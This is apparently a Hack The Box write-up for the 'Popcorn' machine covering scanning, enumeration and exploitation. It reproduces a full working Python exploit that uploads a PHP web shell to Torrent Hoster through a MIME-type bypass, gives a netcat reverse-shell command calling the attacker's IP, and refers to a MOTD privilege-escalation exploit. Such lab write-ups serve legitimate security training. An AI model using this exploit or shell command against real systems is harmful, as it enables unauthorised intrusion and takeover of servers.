---
icon: ubuntu
---

# Popcorn - Medium

<figure><img src="../../.gitbook/assets/image (15) (1).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/popcorn"><strong>Popcorn</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" overflow="wrap" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.6.126 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 14:31 -0400
Nmap scan report for 10.129.6.126
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Did not follow redirect to http://popcorn.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/14%OT=22%CT=1%CU=32029%PV=Y%DS=2%DC=T%G=Y%TM=69B5A9B
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=C7%GCD=1%ISR=CF%TI=Z%CI=Z%II=I%TS=8)SEQ(S
OS:P=CB%GCD=1%ISR=CF%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=CB%GCD=1%ISR=D2%TI=Z%CI=Z%I
OS:I=I%TS=8)SEQ(SP=CC%GCD=1%ISR=CF%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M542ST11NW6%O
OS:2=M542ST11NW6%O3=M542NNT11NW6%O4=M542ST11NW6%O5=M542ST11NW6%O6=M542ST11)
OS:WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=
OS:16D0%O=M542NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)
OS:T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M542ST11NW6%RD=0%Q=)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: popcorn.hackthebox.gr; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   26.84 ms 10.10.16.1
2   64.46 ms 10.129.6.126
```
{% endcode %}

I'll add a dns to my hosts file&#x20;

{% code title="/etc/hosts" overflow="wrap" %}
```shellscript
10.129.6.126	popcorn.htb
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

#### <mark style="color:$primary;">Tech Detection</mark>

{% code title="curl -I http://popcorn.htb" overflow="wrap" %}
```shellscript
HTTP/1.1 200 OK
Date: Sat, 14 Mar 2026 18:34:43 GMT
Server: Apache/2.2.12 (Ubuntu)
Last-Modified: Fri, 17 Mar 2017 17:07:05 GMT
ETag: "aa65-b1-54af035029fd5"
Accept-Ranges: bytes
Content-Length: 177
Vary: Accept-Encoding
Content-Type: text/html
```
{% endcode %}

We have an Apache Web server

#### <mark style="color:$primary;">Directory Busting</mark>

{% code overflow="wrap" %}
```shellscript
feroxbuster -u http://popcorn.htb -n
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A couple of interesting endpoints I'll take a look at each one

#### <mark style="color:$primary;">/test.php & /test</mark>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Reveals info.php

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">/torrent</mark>

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

This is a file sharing application. I'll do some more directory busting on this endpoint

#### <mark style="color:$primary;">Directory busting /torrent</mark>

{% code overflow="wrap" %}
```shellscript
feroxbuster -u http://popcorn.htb/torrent -n
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

A lot of new endpoints to explore. I'll take a loot at the readme first

#### <mark style="color:$primary;">/torrent/readme</mark>

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a version for this application!

I'll look for any available exploits for this version

### <mark style="color:blue;">Torrent Hoster Unauthenticated RCE</mark>

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

There is a POC available on Github I'll download that one

{% embed url="https://github.com/Anon-Exploiter/exploits/blob/master/torrent_hoster_unauthenticated_rce.py" %}

{% code title="Working python3 POC" overflow="wrap" expandable="true" %}
````python
#!/usr/bin/env python

"""

Torrent Hoster - Unauthenticated RCE (tested on Popcorn in HTB)

Exploits the Upload Screenshot for torrents feature -- While exploiting the file uploading feature
in screenshots section found out that an unauthenticated attacker can upload screenshots as well. Since,
anyone can bypass the file-type check by changing the mime-type (to image/jpeg of the following).

  if (($_FILES["file"]["type"] == "image/gif")
  || ($_FILES["file"]["type"] == "image/jpeg")
  || ($_FILES["file"]["type"] == "image/jpg")
  || ($_FILES["file"]["type"] == "image/png")

No extension check on the file results in upload of a .php file which then results in Remote Command 
Execution. Wrote a POC based on that; not something really big! 

You'll require bs4 & requests from pypi to make the exploit work!
	>>> pip instal bs4 
	>>> pip instal requests

"""

import requests
from bs4 import BeautifulSoup
import argparse
import sys
from time import sleep

BANNER = r"""      _____                    _____          
     /\    \                  /\    \         
    /::\    \                /::\____\        
    \:::\    \              /:::/    /        
     \:::\    \            /:::/    /         
      \:::\    \          /:::/    /          
       \:::\    \        /:::/____/           
       /::::\    \      /::::\    \           
      /::::::\    \    /::::::\    \   _____  
     /:::/\:::\    \  /:::/\:::\    \ /\    \ 
    /:::/  \:::\____\/:::/  \:::\    /::\____\
   /:::/    \::/    /\::/    \:::\  /:::/    /
  /:::/    / \/____/  \/____/ \:::\/:::/    / 
 /:::/    /                    \::::::/    /  
/:::/    /                      \::::/    /   
\::/    /                       /:::/    /    
 \/____/                       /:::/    /     
                              /:::/    /      
                             /:::/    /       
                             \::/    /        
                              \/____/   @syed__umar
"""

FOOTER 	= """
[&] Thanks for exploiting me senpai ^_^
"""

def cleanURL(url):
	url 	= url.replace("index.php", "")
	if url[::-1][0] != "/": return(url + "/")
	else: return(url)

def addSuspense(delay=0.5):
	for x in range(5):	print("."); sleep(delay)

def parseTorrents(url):
	print("[#] Browsing torrents on the website")
	request 	= requests.get(url + "index.php?mode=directory").text
	soup 		= BeautifulSoup(request, 'html.parser').find_all('td', {'align': 'left', 'width': '300'})

	if len(soup) == 0:
		exit("[!] Dang; Better luck next time!\n```\nNo torrents found on the website!\n```")

	torrents 	= []

	print("[~] Found the following torrents with IDs:\n```")
	for elements in soup[::-1]: # Reverse The List -- Select the last possible torrent to overwrite4
		# print(elements)
		tId 	= elements.a['href'].split("=")[::-1][0]
		path 	= url + "upload_file.php?mode=upload&id=" + tId
		print(tId)
		torrents.append(path)

	print("```")
	torrent_id = torrents[0].split("=")[-1]
	print(f"\n[$] Selecting the last possible torrent({torrent_id}) to upload screenshot to!")
	return(torrents[0])

def uploadShell(path):
	print("[#] Uploading WebShell")
	request 	= requests.post(path,
		headers = {
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", 
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
			"Accept-Language": "en-US,en;q=0.5", 
			"Accept-Encoding": "gzip, deflate", 
			"Content-Type": "multipart/form-data; boundary=---------------------------557387531096085749533931648",
			"Connection": "close", 
		},
		data = "-----------------------------557387531096085749533931648\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\nsystem($_GET['c']);\n\n?>\n\r\n-----------------------------557387531096085749533931648\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nSubmit Screenshot\r\n-----------------------------557387531096085749533931648--\r\n"
	).text
	return (request)

def accessShell(url, path):
	tId 		= path.split("=")[::-1][0]
	print("\n[$] Whoa, we got a shell dude! Spawning Console!!!")

	command 	= 	""
	shellPath 	= url + "/upload/" + tId +".php?c=" + command
	print("[&] Shell Uploaded: " + shellPath)
	addSuspense()

	while True:
		try:
			command 	= input("$ ")
			request 	= requests.get(shellPath + command)
			print(request.text)

		except KeyboardInterrupt:
			exit("\n[@] Okay boomer!" + FOOTER)

def main():
	print(BANNER)
	parser 		= argparse.ArgumentParser(description="Uploads WebShell on *Add Screenshot* feature as an unauthenticated user.", usage='\rUsage: python '+ sys.argv[0] + ' --url=http://host/torrentHoster/')
	parser._optionals.title = "Basic Help"

	basicFuncs 	= parser.add_argument_group('Actions')
	basicFuncs.add_argument('--debug', 	action="store", 	dest="debug", 	default=False, 	help="Prints Everything -- Poor Man's Debugging")
	basicFuncs.add_argument('--url', 	action="store", 	dest="url", 	default=False, 	help='URL of Torrent Hoster hosted somewhere')
	args 		= parser.parse_args()

	if args.url:
		args.url 	= cleanURL(args.url)
		path 		= parseTorrents(args.url)

		if path != None:
			if "Upload Completed." in uploadShell(path):
				accessShell(args.url, path)

			else:
				print("[!] Dang; Better luck next time!")

		else:
			print("[!] Dang; Better luck next time!\n```\nHost({}) isn't vulnerable!\n```".format(args.url))

	else:
		parser.print_help()

	print(FOOTER)

if __name__ == '__main__':
	main()

````
{% endcode %}

{% code overflow="wrap" expandable="true" %}
```shellscript
python3 torrent_hoster_unauthenticated_rce.py --url=http://popcorn.htb/torrent/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'll get a better shell using netcat

{% code overflow="wrap" expandable="true" %}
```shellscript
nc 10.10.16.63 443 -e /bin/bash
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Shell as www-data</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3301).png" alt=""><figcaption></figcaption></figure>

Discovered Interesting hidden file in george home directory: `/home/george/.cache/motd.legal-displayed`&#x20;

### <mark style="color:blue;">MOTD File Tampering Privesc</mark>

I've never seen this file before so I'll google it&#x20;

<figure><img src="../../.gitbook/assets/image (3302).png" alt=""><figcaption></figcaption></figure>

This is a known privesc vulnerability related to **MOTD (Message of the Day) file execution by PAM**

The vulnerability allows injected commands in MOTD scripts to be executed with elevated privileges during login.

I'll download the public exploit from Exploit-DB and transfer it to the target machine

<figure><img src="../../.gitbook/assets/image (3303).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3304).png" alt=""><figcaption></figcaption></figure>
